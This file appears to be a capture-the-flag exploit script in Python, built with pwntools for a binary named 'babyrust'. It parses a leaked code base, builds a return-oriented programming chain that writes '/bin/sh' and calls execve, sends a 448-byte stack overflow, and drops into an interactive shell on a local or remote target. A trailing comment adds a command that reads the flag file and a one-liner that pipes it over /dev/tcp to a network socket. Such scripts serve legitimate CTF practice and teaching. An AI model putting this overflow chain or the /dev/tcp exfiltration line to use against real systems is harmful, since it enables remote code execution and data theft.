#!/usr/bin/env python3
'''
Pwn3d by pwn2ooown
'''
from pwn import *
import sys
import time
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]
# brva x = b *(pie+x)
# set follow-fork-mode 
# p/x $fs_base
# vis_heap_chunks
# set debug-file-directory /usr/src/glibc/glibc-2.35
# directory /usr/src/glibc/glibc-2.35/malloc/
# handle SIGALRM ignore
if len(sys.argv) == 1:
    r = process("./babyrust")
    if args.GDB:
        gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
s       = lambda data               :r.send(data)
sa      = lambda x, y               :r.sendafter(x, y)
sl      = lambda data               :r.sendline(data)
sla     = lambda x, y               :r.sendlineafter(x, y)
ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
uu32    = lambda data,num           :u32(r.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(r.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))
l64     = lambda      :u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(r.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))

ru("Magic: ")
codebase = int(ru("\n"),16)-0x51008
leak("codebase",hex(codebase))
from struct import pack

p = lambda x : pack('Q', x)

IMAGE_BASE_0 = codebase
rebase_0 = lambda x : p(x + IMAGE_BASE_0)

rop = b''

rop += rebase_0(0x0000000000008bc3) # 0x0000000000008bc3: pop rax; ret;
rop += b'/bin/sh\x00'
rop += rebase_0(0x0000000000007052) # 0x0000000000007052: pop rdi; ret;
rop += rebase_0(0x0000000000051000)
rop += rebase_0(0x0000000000010a20) # 0x0000000000010a20: mov qword ptr [rdi], rax; ret;
rop += rebase_0(0x0000000000008bc3) # 0x0000000000008bc3: pop rax; ret;
rop += p(0x0000000000000000)
rop += rebase_0(0x0000000000007052) # 0x0000000000007052: pop rdi; ret;
rop += rebase_0(0x0000000000051008)
rop += rebase_0(0x0000000000010a20) # 0x0000000000010a20: mov qword ptr [rdi], rax; ret;
# Filled registers: rdi, rsi, rax,
rop += rebase_0(0x0000000000007052) # 0x0000000000007052: pop rdi; ret;
rop += p64(0x3b)
rop += rebase_0(0x0000000000006b96) # 0x0000000000006b96: pop rsi; ret;
rop += rebase_0(0x0000000000051000)
rop += rebase_0(0x0000000000007438) # 0x0000000000008bc3: pop rcx; ret;
rop += rebase_0(0x0000000000051008)
# 0x000000000002d28a : mov rdx, rcx ; ret
rop += rebase_0(0x000000000002d28a)
rop += p64(codebase+0x99de) # execve gadget
# rop += p64(0xDEADBEEF)
sla("overflow: ",b'A' * 448 + rop)

r.interactive()

'''
Writeup:
'''


'''
cat /home/`whoami`/f*



In extreme condition maybe we can use
cat /home/$(whoami)/flag | bash -c 'exec 3<>/dev/tcp/0.0.0.0/12345; cat >&3' > /dev/null
'''